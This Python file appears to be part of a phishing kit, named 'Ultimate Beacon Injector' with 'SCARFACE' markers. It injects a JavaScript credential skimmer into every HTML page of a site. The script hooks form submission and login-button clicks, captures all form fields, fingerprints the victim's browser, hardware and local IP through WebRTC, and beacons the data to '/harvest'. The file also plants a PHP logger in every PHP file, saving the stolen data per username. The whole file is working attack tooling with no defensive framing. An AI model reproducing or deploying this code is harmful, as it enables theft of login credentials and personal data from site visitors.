"""
Ultimate Beacon Injector - Advanced Client Info Collector
"""
import os
import re

class ModernInjector:
    def __init__(self, site_dir, site_name, credentials_dir):
        self.site_dir = site_dir
        self.site_name = site_name
        self.credentials_dir = credentials_dir
        self.injection_stats = {'html_files': 0, 'php_files': 0, 'failed': 0}
        
    def inject_all(self):
        print(f"[*] Starting Ultimate Beacon injection for {self.site_name}")
        js_payload = self._generate_payload()
        self._inject_html(js_payload)
        self._inject_php()
        print(f"[*] Injection complete: {self.injection_stats}")
        return self.injection_stats
    
    def _generate_payload(self):
        return """
<!-- SCARFACE_ULTIMATE_BEACON -->
<script>
(function() {
    console.log('[SCARFACE] Ultimate beacon loaded');

    // ---- Collect Advanced Client Info ----
    function getClientInfo() {
        var info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            },
            hardware: {
                deviceMemory: navigator.deviceMemory || 'unknown',
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                touchSupport: 'ontouchstart' in window
            },
            network: {
                connection: navigator.connection || {},
                downlink: (navigator.connection ? navigator.connection.downlink : 'unknown'),
                effectiveType: (navigator.connection ? navigator.connection.effectiveType : 'unknown'),
                rtt: (navigator.connection ? navigator.connection.rtt : 'unknown'),
                type: (navigator.connection ? navigator.connection.type : 'unknown')
            },
            battery: {}
        };

        // Battery API (if available)
        if (navigator.getBattery) {
            navigator.getBattery().then(function(batt) {
                info.battery.level = batt.level * 100 + '%';
                info.battery.charging = batt.charging;
                info.battery.chargingTime = batt.chargingTime;
                info.battery.dischargingTime = batt.dischargingTime;
            }).catch(function(){});
        }

        // --- Get Local IP via WebRTC (with fallback) ---
        var localIP = null;
        var rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('');
        rtc.createOffer().then(function(offer) {
            rtc.setLocalDescription(offer);
        }).catch(function(){});
        rtc.onicecandidate = function(e) {
            if (e.candidate && e.candidate.candidate) {
                var ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) {
                    localIP = ipMatch[0];
                }
            }
        };
        // Fallback: use hostname or simple IP detection
        setTimeout(function() {
            if (!localIP) {
                // Use a simple method: try to fetch from a service (optional)
                // For now, just set to 'unknown'
                localIP = 'unknown (WebRTC unavailable)';
            }
            info.localIP = localIP;
        }, 1000);

        // Return the info (we'll update localIP later via another call)
        return info;
    }

    function captureData(form) {
        if(!form) return;
        var data = {};
        for(var i=0; i<form.elements.length; i++){
            var el = form.elements[i];
            if(el.name && el.value !== undefined && el.type !== 'submit' && el.type !== 'button') {
                data[el.name] = el.value;
            }
        }
        if(Object.keys(data).length === 0) return;

        console.log('[SCARFACE] ✅ CAPTURED:', data);

        // Attach client info
        var clientInfo = getClientInfo();
        // Send as separate field 'client_info' (we'll have to send it as part of the payload)
        var payload = {
            form_data: data,
            client_info: clientInfo,
            timestamp: new Date().toISOString()
        };

        // Guaranteed delivery on page unload
        var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
        if(navigator.sendBeacon('/harvest', blob)) {
            console.log('[SCARFACE] Beacon sent successfully');
        } else {
            fetch('/harvest', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).catch(e => console.log('[SCARFACE] Fetch error:', e));
        }
    }

    // Override native form submit
    var originalSubmit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {
        captureData(this);
        originalSubmit.call(this);
    };

    // Catch button clicks
    document.addEventListener('click', function(e) {
        var btn = e.target.closest('button, div[role="button"], input[type="submit"]');
        if(btn) {
            var text = (btn.textContent || btn.value || '').toLowerCase().trim();
            if(text.includes('log in') || text.includes('login') || text.includes('sign in')) {
                var form = btn.closest('form') || document.querySelector('form');
                if(form) {
                    captureData(form);
                }
            }
        }
    }, true);

    console.log('[SCARFACE] Ready');
})();
</script>
"""
    
    def _inject_html(self, js_payload):
        for root, _, files in os.walk(self.site_dir):
            for file in files:
                if file.lower().endswith('.html'):
                    html_file = os.path.join(root, file)
                    try:
                        with open(html_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        new_content = re.sub(r'<!-- SCARFACE_.*?-->\s*<script>.*?</script>', '', content, flags=re.DOTALL)
                        
                        if '</body>' in new_content:
                            new_content = new_content.replace('</body>', js_payload + '\n</body>')
                        else:
                            new_content = new_content + js_payload
                        
                        if new_content == content:
                            continue
                        
                        backup = html_file + '.bak'
                        if not os.path.exists(backup):
                            with open(backup, 'w', encoding='utf-8') as f:
                                f.write(content)
                        
                        with open(html_file, 'w', encoding='utf-8') as f:
                            f.write(new_content)
                        
                        self.injection_stats['html_files'] += 1
                        print(f"[+] Injected: {os.path.relpath(html_file, self.site_dir)}")
                        
                    except Exception as e:
                        self.injection_stats['failed'] += 1
                        print(f"[!] Failed: {html_file} - {e}")
    
    def _inject_php(self):
        logger_code = f"""
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $data = json_decode(file_get_contents('php://input'), true);
    if (!$data) {{ parse_str(file_get_contents('php://input'), $data); }}
    
    $log_dir = '{os.path.join(self.credentials_dir, self.site_name)}';
    if (!file_exists($log_dir)) {{ mkdir($log_dir, 0777, true); }}
    
    $username = isset($data['form_data']['username']) ? $data['form_data']['username'] : (isset($data['form_data']['email']) ? $data['form_data']['email'] : 'unknown');
    $username = preg_replace('/[^a-zA-Z0-9._-]/', '_', $username);
    $timestamp = date('Ymd_His') . '_' . substr(microtime(), 2, 3);
    $filename = $log_dir . '/' . $username . '_' . $timestamp . '.json';
    
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}}
?>
"""
        for root, _, files in os.walk(self.site_dir):
            for file in files:
                if file.lower().endswith('.php') and not file.endswith('.bak'):
                    php_file = os.path.join(root, file)
                    try:
                        with open(php_file, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        if 'SCARFACE_ULTIMATE_BEACON' in content:
                            continue
                        
                        strpos = content.find('<?php')
                        if strpos != -1:
                            end_pos = content.find('?>', strpos)
                            if end_pos != -1:
                                new_content = content[:end_pos+2] + "\n" + logger_code + content[end_pos+2:]
                            else:
                                new_content = content + "\n" + logger_code
                        else:
                            new_content = logger_code + content
                        
                        backup = php_file + '.bak'
                        if not os.path.exists(backup):
                            with open(backup, 'w', encoding='utf-8') as f:
                                f.write(content)
                        
                        with open(php_file, 'w', encoding='utf-8') as f:
                            f.write(new_content)
                        
                        self.injection_stats['php_files'] += 1
                        print(f"[+] Injected PHP: {os.path.relpath(php_file, self.site_dir)}")
                    except Exception as e:
                        self.injection_stats['failed'] += 1

# Compatibility
def inject_logger_to_all_html(site_dir):
    injector = ModernInjector(site_dir, os.path.basename(site_dir), None)
    return injector._inject_html(injector._generate_payload())

def inject_logger_to_php(site_dir, site_name, credentials_dir):
    injector = ModernInjector(site_dir, site_name, credentials_dir)
    return injector._inject_php()
